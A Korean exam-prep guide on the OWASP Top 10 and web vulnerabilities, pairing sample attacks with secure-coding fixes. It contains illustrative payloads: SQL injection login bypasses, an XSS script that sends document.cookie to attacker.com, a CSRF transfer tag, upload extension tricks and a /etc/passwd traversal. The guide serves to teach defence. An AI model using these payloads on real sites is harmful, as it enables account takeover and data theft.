# OWASP Top 10 및 웹 취약점 - 실기 필수 암기

## 🔴 OWASP Top 10 (2021) 필수 암기

```
┌────┬────────────────────────────────┬──────────────────┐
│순위│        취약점명 (영문)          │   한글명         │
├────┼────────────────────────────────┼──────────────────┤
│ 1  │ Broken Access Control          │ 접근 통제 실패   │
│ 2  │ Cryptographic Failures         │ 암호화 실패      │
│ 3  │ Injection                      │ 인젝션 ★★★     │
│ 4  │ Insecure Design                │ 안전하지 않은 설계│
│ 5  │ Security Misconfiguration      │ 보안 설정 오류   │
│ 6  │ Vulnerable and Outdated        │ 취약하고 오래된  │
│    │ Components                     │ 구성 요소        │
│ 7  │ Identification and             │ 식별 및 인증 실패│
│    │ Authentication Failures        │                  │
│ 8  │ Software and Data Integrity    │ 소프트웨어 및    │
│    │ Failures                       │ 데이터 무결성 실패│
│ 9  │ Security Logging and           │ 보안 로깅 및     │
│    │ Monitoring Failures            │ 모니터링 실패    │
│10  │ Server-Side Request Forgery    │ 서버 측 요청 위조│
│    │ (SSRF)                         │ (SSRF)           │
└────┴────────────────────────────────┴──────────────────┘
```

---

## 📝 기출 유형 1: SQL Injection ★★★ (최빈출!)

### 개념
```
공격자가 악의적인 SQL 쿼리를 삽입하여
데이터베이스를 비정상적으로 조작하는 공격

공격 대상: 입력값 검증이 없는 동적 SQL 쿼리
```

### 문제 1-1 (2023년 실기)
```
다음은 로그인 처리 코드이다. SQL Injection 취약점이 있는
부분을 찾고, 안전한 코드로 수정하시오.

[취약한 코드 - PHP]
$id = $_POST['id'];
$pw = $_POST['pw'];
$query = "SELECT * FROM users WHERE id='$id' AND pw='$pw'";
$result = mysqli_query($conn, $query);
```

**✅ 답안:**
```
취약점:
사용자 입력값($id, $pw)을 검증 없이 직접 쿼리에 삽입하여
SQL Injection 공격 가능

공격 예시:
id에 "admin' --" 입력 시:
SELECT * FROM users WHERE id='admin' --' AND pw='...'
→ 패스워드 검증 우회 (-- 이후 주석 처리)

안전한 코드 (Prepared Statement):

PHP:
$stmt = $conn->prepare("SELECT * FROM users WHERE id=? AND pw=?");
$stmt->bind_param("ss", $id, $pw);
$stmt->execute();
$result = $stmt->get_result();

Java:
PreparedStatement pstmt = conn.prepareStatement(
    "SELECT * FROM users WHERE id=? AND pw=?");
pstmt.setString(1, id);
pstmt.setString(2, pw);
ResultSet rs = pstmt.executeQuery();
```

---

### 문제 1-2 (SQL Injection 공격 페이로드)
```
다음 SQL Injection 공격 페이로드가 우회하는 것을 설명하시오.

입력값: admin' OR '1'='1
```

**✅ 답안:**
```
원래 쿼리:
SELECT * FROM users WHERE id='admin' OR '1'='1' AND pw='...'

실행 결과:
WHERE id='admin' 또는 '1'='1' (항상 참)
→ 모든 사용자 정보 조회 가능
→ 인증 우회

공격 성공 조건:
- 입력값 검증 없음
- 동적 쿼리 사용
- 에러 메시지 노출 (Blind SQL Injection 시 활용)
```

---

### 문제 1-3 (SQL Injection 방어 기법)
```
SQL Injection 공격을 방어하기 위한 4가지 방법을 쓰시오.
```

**✅ 답안:**
```
1. Prepared Statement (매개변수화된 쿼리) 사용 ★★★
   - 쿼리와 데이터 분리
   - 가장 효과적인 방어 방법

2. 입력값 검증 (Whitelist 방식)
   - 허용된 문자만 입력 허용
   - 특수문자 필터링 (', ", --, ;, /* 등)

3. ORM (Object-Relational Mapping) 사용
   - Hibernate, JPA, Django ORM
   - SQL 쿼리 자동 생성 및 보호

4. 최소 권한 원칙
   - DB 계정에 SELECT만 허용 (DROP, DELETE 금지)
   - 에러 메시지 상세 정보 숨김
```

---

## 📝 기출 유형 2: XSS (Cross-Site Scripting) ★★★

### 개념
```
공격자가 악성 스크립트를 웹 페이지에 삽입하여
다른 사용자의 브라우저에서 실행시키는 공격

목적: 세션 쿠키 탈취, 피싱, 악성 코드 유포
```

### XSS 유형
```
1. Reflected XSS (반사형)
   - 입력값이 즉시 응답에 반영
   - URL 파라미터를 통한 공격
   - 예: search=<script>alert('XSS')</script>

2. Stored XSS (저장형) ★
   - 악성 스크립트가 DB에 저장
   - 게시판, 댓글에 스크립트 삽입
   - 피해 범위 큼 (모든 열람자 피해)

3. DOM-based XSS
   - 클라이언트 측 JavaScript에서 발생
   - 서버 개입 없이 DOM 조작
```

### 문제 2-1 (2022년 실기)
```
다음 코드의 XSS 취약점을 찾고 안전한 코드로 수정하시오.

[취약한 코드 - JSP]
<%
String name = request.getParameter("name");
%>
<h1>환영합니다, <%= name %> 님!</h1>
```

**✅ 답안:**
```
취약점:
사용자 입력값(name)을 검증 없이 HTML에 출력하여
XSS 공격 가능

공격 예시:
name=<script>location.href='http://attacker.com?cookie='+document.cookie</script>
→ 세션 쿠키 탈취

안전한 코드:

JSP (JSTL 사용):
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<h1>환영합니다, <c:out value="${name}"/> 님!</h1>

또는 HTML 인코딩:
<%
String name = request.getParameter("name");
name = StringEscapeUtils.escapeHtml4(name);
%>
<h1>환영합니다, <%= name %> 님!</h1>

PHP:
echo "환영합니다, " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . " 님!";
```

---

### 문제 2-2 (XSS 방어 기법)
```
XSS 공격을 방어하기 위한 방법 3가지를 쓰시오.
```

**✅ 답안:**
```
1. 출력 인코딩 (Output Encoding) ★★★
   - HTML 인코딩: < → &lt; , > → &gt;
   - JavaScript 인코딩
   - URL 인코딩
   - 함수: htmlspecialchars(), encodeURIComponent()

2. 입력값 검증 (Input Validation)
   - Whitelist 방식: 허용된 문자만 입력
   - 특수문자 필터링: <, >, ", ', /, script 등
   - 길이 제한

3. CSP (Content Security Policy) 헤더 설정
   - HTTP 응답 헤더에 추가
   - 인라인 스크립트 실행 차단
   - 허용된 출처에서만 스크립트 로드

   예시:
   Content-Security-Policy: default-src 'self'; script-src 'self'

4. HttpOnly 쿠키 플래그 설정
   - JavaScript로 쿠키 접근 불가
   - document.cookie 차단

   예시:
   Set-Cookie: sessionid=abc123; HttpOnly; Secure
```

---

## 📝 기출 유형 3: CSRF (Cross-Site Request Forgery) ★★

### 개념
```
공격자가 사용자의 권한을 도용하여
의도하지 않은 요청을 서버로 전송하는 공격

조건: 사용자가 인증된 상태 (로그인 유지)
```

### 문제 3-1 (2023년 실기)
```
CSRF 공격의 동작 원리와 방어 방법을 설명하시오.
```

**✅ 답안:**
```
동작 원리:
1. 사용자가 정상 사이트(bank.com)에 로그인
2. 세션 쿠키가 브라우저에 저장됨
3. 공격자가 악성 페이지(attacker.com) 작성
   <img src="http://bank.com/transfer?to=attacker&amount=1000000">
4. 사용자가 악성 페이지 방문
5. 브라우저가 자동으로 bank.com에 요청 전송 (쿠키 포함)
6. 서버는 정상 요청으로 판단하여 송금 처리

방어 방법:

1. CSRF 토큰 사용 ★★★
   - 서버에서 랜덤 토큰 생성 및 세션 저장
   - 폼에 hidden 필드로 토큰 포함
   - 요청 시 토큰 검증

   예시 (HTML):
   <form action="/transfer" method="POST">
       <input type="hidden" name="csrf_token" value="랜덤토큰">
       <input type="text" name="to">
       <input type="number" name="amount">
       <button type="submit">송금</button>
   </form>

2. SameSite 쿠키 속성 설정
   Set-Cookie: sessionid=abc; SameSite=Strict

   - Strict: 같은 사이트에서만 쿠키 전송
   - Lax: GET 요청에만 쿠키 전송

3. Referer 검증
   - 요청 출처 확인 (HTTP Referer 헤더)
   - 자사 도메인에서의 요청만 허용

4. 중요 작업에 재인증 요구
   - 비밀번호 재입력
   - OTP 인증
```

---

## 📝 기출 유형 4: 파일 업로드 취약점 ★★

### 문제 4-1 (2022년 실기)
```
파일 업로드 기능의 보안 취약점과 대응 방안을 설명하시오.
```

**✅ 답안:**
```
취약점:
1. 악성 파일 업로드
   - 웹 셸(Web Shell) 업로드: .php, .jsp, .asp
   - 실행 후 서버 장악

2. 확장자 우회
   - 더블 확장자: shell.php.jpg
   - Null Byte: shell.php%00.jpg
   - 대소문자: shell.PhP

3. 디렉토리 트래버설
   - 파일명: ../../etc/passwd
   - 임의 경로에 파일 저장

대응 방안:

1. 확장자 화이트리스트 검증 ★★★
   허용: .jpg, .png, .gif, .pdf
   차단: .php, .jsp, .asp, .exe, .sh

   예시 (PHP):
   $allowed = array('jpg', 'png', 'gif');
   $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
   if (!in_array(strtolower($ext), $allowed)) {
       die("허용되지 않는 파일 형식");
   }

2. MIME Type 검증
   if ($_FILES['file']['type'] != 'image/jpeg') {
       die("이미지 파일만 업로드 가능");
   }

3. 파일 내용 검증 (Magic Number)
   - JPEG: FF D8 FF
   - PNG: 89 50 4E 47
   - GIF: 47 49 46 38

4. 업로드 디렉토리 실행 권한 제거
   - 웹 서버 설정에서 스크립트 실행 차단
   - Apache: .htaccess에 php_flag engine off

5. 파일명 변경
   - UUID 또는 해시값으로 저장
   - 예: upload_20241105_a3b5c7d9.jpg

6. 파일 크기 제한
   - PHP: upload_max_filesize = 2M
   - 애플리케이션 레벨에서도 검증
```

---

## 📝 기출 유형 5: 디렉토리 트래버설 (Path Traversal) ★

### 문제 5-1
```
다음 코드의 취약점과 안전한 코드를 작성하시오.

[취약한 코드]
<?php
$file = $_GET['file'];
include("/var/www/html/" . $file);
?>
```

**✅ 답안:**
```
취약점:
경로 조작 공격 (Path Traversal)
file=../../../../etc/passwd 입력 시
→ /var/www/html/../../../../etc/passwd
→ /etc/passwd 파일 노출

안전한 코드:

1. 화이트리스트 방식
<?php
$allowed_files = array('home.php', 'about.php', 'contact.php');
$file = $_GET['file'];
if (in_array($file, $allowed_files)) {
    include("/var/www/html/" . $file);
} else {
    die("허용되지 않은 파일");
}
?>

2. 경로 정규화 및 검증
<?php
$file = $_GET['file'];
$base = realpath("/var/www/html/");
$path = realpath("/var/www/html/" . $file);

// 기본 경로 내에 있는지 확인
if ($path && strpos($path, $base) === 0) {
    include($path);
} else {
    die("잘못된 경로");
}
?>

3. 위험 문자 필터링
- ../ (상위 디렉토리)
- \, / (경로 구분자)
- Null Byte (%00)
```

---

## 🎯 웹 취약점 핵심 암기 카드

### 카드 1: SQL Injection 방어
```
1순위: Prepared Statement (매개변수화 쿼리)
2순위: ORM 사용
3순위: 입력값 검증 (Whitelist)
4순위: 최소 권한 원칙

금지 패턴: ', ", --, ;, /*, */, xp_, UNION, SELECT
```

### 카드 2: XSS 방어
```
출력 시: HTML 인코딩 (htmlspecialchars)
입력 시: Whitelist 검증
HTTP 헤더: CSP (Content-Security-Policy)
쿠키: HttpOnly, Secure 플래그

인코딩:
< → &lt;
> → &gt;
" → &quot;
' → &#x27;
```

### 카드 3: CSRF 방어
```
1. CSRF 토큰 (랜덤값)
2. SameSite 쿠키 속성
3. Referer 검증
4. 재인증 (비밀번호, OTP)
```

### 카드 4: 파일 업로드 방어
```
1. 확장자 화이트리스트
2. MIME Type 검증
3. Magic Number 확인
4. 업로드 디렉토리 실행 권한 제거
5. 파일명 변경 (UUID)
6. 크기 제한
```

---

## 📊 그림으로 이해하기

### SQL Injection 공격 흐름
```
[정상 로그인]
사용자 입력: id=admin, pw=1234
생성 쿼리: SELECT * FROM users WHERE id='admin' AND pw='1234'
결과: 정상 인증

[SQL Injection 공격]
사용자 입력: id=admin' --, pw=아무거나
생성 쿼리: SELECT * FROM users WHERE id='admin' --' AND pw='...'
           (-- 이후 주석 처리)
실제 실행: SELECT * FROM users WHERE id='admin'
결과: 패스워드 검증 우회, 인증 성공!
```

### XSS 공격 흐름
```
[Stored XSS]
1. 공격자가 게시판에 악성 스크립트 작성
   게시물: <script>location.href='http://attacker.com?c='+document.cookie</script>

2. 악성 스크립트가 DB에 저장
   DB: [id=123, content=<script>...</script>]

3. 피해자가 게시물 조회
   서버 → 브라우저: <script>...</script> 포함된 HTML

4. 브라우저에서 스크립트 실행
   → 세션 쿠키가 공격자 서버로 전송
   → 공격자가 피해자 계정으로 로그인
```

### CSRF 공격 흐름
```
1. 피해자가 bank.com 로그인 (세션 유지)

2. 공격자가 악성 페이지 제작
   <img src="http://bank.com/transfer?to=attacker&amount=1000000">

3. 피해자가 attacker.com 방문

4. 브라우저가 자동으로 은행 사이트에 요청
   GET http://bank.com/transfer?to=attacker&amount=1000000
   Cookie: sessionid=abc123 (자동 포함)

5. 은행 서버는 정상 요청으로 판단
   → 송금 처리

[CSRF 토큰으로 방어]
1. 서버: 폼 생성 시 랜덤 토큰 발급
   <input type="hidden" name="csrf_token" value="xYz123">

2. 공격자는 토큰 값을 알 수 없음

3. 서버: 요청 시 토큰 검증 → 공격 차단
```

---

## 💡 실기 답안 작성 팁

### Tip 1: 코드 작성 시 언어 명시
```
✅ [PHP 코드]
   htmlspecialchars($name, ENT_QUOTES, 'UTF-8')

✅ [Java 코드]
   PreparedStatement pstmt = ...

명확한 언어 표기로 채점자 이해 도움
```

### Tip 2: 취약점과 대응을 모두 작성
```
문제: "SQL Injection 취약점을 설명하시오"

✅ 취약점: 입력값 검증 없이 쿼리 생성
   대응: Prepared Statement 사용

❌ 대응만 작성 (취약점 설명 누락)
```

### Tip 3: 구체적인 예시 포함
```
✅ CSRF 토큰 예시:
   <input type="hidden" name="csrf_token" value="랜덤토큰">

❌ "토큰 사용" (구체성 부족)
```

### Tip 4: 우선순위 표시
```
SQL Injection 방어:
1순위: Prepared Statement ★★★ (가장 효과적)
2순위: ORM
3순위: 입력값 검증
```

---

## 🔥 실기 시험 최빈출 웹 취약점 (꼭 외우기!)

```
1위: SQL Injection         ← 매년 출제! (코드 수정 문제)
2위: XSS                   ← 매년 출제! (HTML 인코딩)
3위: CSRF                  ← 자주 출제 (토큰 방식)
4위: 파일 업로드 취약점    ← 자주 출제 (확장자 검증)
5위: 디렉토리 트래버설     ← 가끔 출제
```

**✅ 이 5개 취약점과 방어 기법만 정확히 외우면 웹 보안 문제 90% 커버!**
